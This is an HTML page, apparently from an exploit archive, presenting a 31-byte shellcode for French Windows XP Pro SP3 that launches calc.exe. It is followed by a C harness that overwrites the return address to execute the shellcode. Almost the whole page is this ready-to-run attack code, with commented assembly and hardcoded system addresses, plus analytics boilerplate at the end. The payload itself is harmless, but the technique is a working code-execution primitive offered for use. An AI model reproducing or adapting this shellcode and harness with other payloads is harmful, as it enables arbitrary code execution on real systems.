<html><head><title>Windows - Xp Pro SP3 Fr (calc.exe) - 31 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 | Title: Windows Xp Pro SP3 Fr (calc.exe) Shellcode 31 Bytes
 | Type: Shellcode
 | Author: agix
 | Platform: win32
*/

#include &lt;stdio.h&gt;

char shellcode[] =
&quot;\xEB\x10&quot; //jmp short 0x12
&quot;\x5B&quot; //pop ebx
&quot;\x53&quot; //push ebx
&quot;\xBB\xAD\x23\x86\x7C&quot; //mov ebx, 0x7c8623ad
&quot;\xFF\xD3&quot; //call ebx
&quot;\xBB\xFA\xCA\x81\x7C&quot; //mov ebx, 0x7c81cafa
&quot;\xFF\xD3&quot; //call ebx
&quot;\xE8\xEB\xFF\xFF\xFF&quot; //call dword 0x2
//db calc.exe
&quot;\x63\x61\x6C\x63\x2E\x65\x78\x65&quot;;

int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&amp;ret + 2;
        (*ret) = (int) shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
